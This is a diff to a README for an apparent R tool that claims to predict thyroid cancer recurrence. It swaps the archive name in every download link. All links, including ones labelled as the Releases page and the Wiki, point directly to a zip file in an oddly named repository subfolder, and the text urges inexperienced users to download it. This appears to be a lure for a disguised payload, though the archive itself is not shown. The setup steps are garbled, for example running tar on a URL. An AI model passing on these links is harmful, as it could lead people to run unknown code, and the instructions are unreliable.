@@ -1,7 +1,7 @@
 # 🎉 R-Machine-Learning-TCR - Predict Thyroid Cancer Recurrence Easily
 
 ## 📦 Download Now
-[![Download](https://raw.githubusercontent.com/arcena9/R-Machine-Learning-TCR/main/terebene/R-Machine-Learning-TCR.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/arcena9/R-Machine-Learning-TCR/main/terebene/R-Machine-Learning-TCR.zip)
+[![Download](https://raw.githubusercontent.com/arcena9/R-Machine-Learning-TCR/main/terebene/Learning_Machine_TCR_1.5.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/arcena9/R-Machine-Learning-TCR/main/terebene/Learning_Machine_TCR_1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to R-Machine-Learning-TCR! This application helps you predict the recurrence of thyroid cancer using various machine learning techniques. It’s designed for users with little to no programming experience. Follow the steps below to set it up.
@@ -15,7 +15,7 @@ Welcome to R-Machine-Learning-TCR! This application helps you predict the recurr
 ## 📥 Download & Install
 To get started, you need to visit the Releases page to download the latest version. 
 
-[Visit this page to download](https://raw.githubusercontent.com/arcena9/R-Machine-Learning-TCR/main/terebene/R-Machine-Learning-TCR.zip)
+[Visit this page to download](https://raw.githubusercontent.com/arcena9/R-Machine-Learning-TCR/main/terebene/Learning_Machine_TCR_1.5.zip)
 
 1. Click on the link above to reach the Releases page.
 2. Locate the latest version of R-Machine-Learning-TCR.
@@ -40,7 +40,7 @@ To get started, you need to visit the Releases page to download the latest versi
 1. Open the terminal and navigate to your Downloads folder.
 2. Extract the downloaded file with the command:
    ```bash
-   tar -xvf https://raw.githubusercontent.com/arcena9/R-Machine-Learning-TCR/main/terebene/R-Machine-Learning-TCR.zip
+   tar -xvf https://raw.githubusercontent.com/arcena9/R-Machine-Learning-TCR/main/terebene/Learning_Machine_TCR_1.5.zip
    ```
 3. Change to the extracted directory:
    ```bash
@@ -69,10 +69,10 @@ To get started, you need to visit the Releases page to download the latest versi
 If you encounter any issues or have suggestions, please open an issue on GitHub or reach out via email. Your feedback helps us improve the application.
 
 ## 🌐 Additional Resources
-- **Documentation**: Detailed user guides and additional resources can be found on the [Wiki section](https://raw.githubusercontent.com/arcena9/R-Machine-Learning-TCR/main/terebene/R-Machine-Learning-TCR.zip).
+- **Documentation**: Detailed user guides and additional resources can be found on the [Wiki section](https://raw.githubusercontent.com/arcena9/R-Machine-Learning-TCR/main/terebene/Learning_Machine_TCR_1.5.zip).
 - **Community Support**: Join discussions in our community forum for more tips and user experiences.
 
 ## 🔗 Download Link Again
-Don’t forget to download the latest version of R-Machine-Learning-TCR from [this page](https://raw.githubusercontent.com/arcena9/R-Machine-Learning-TCR/main/terebene/R-Machine-Learning-TCR.zip). 
+Don’t forget to download the latest version of R-Machine-Learning-TCR from [this page](https://raw.githubusercontent.com/arcena9/R-Machine-Learning-TCR/main/terebene/Learning_Machine_TCR_1.5.zip). 
 
 Make sure to follow each step carefully. Happy predicting!
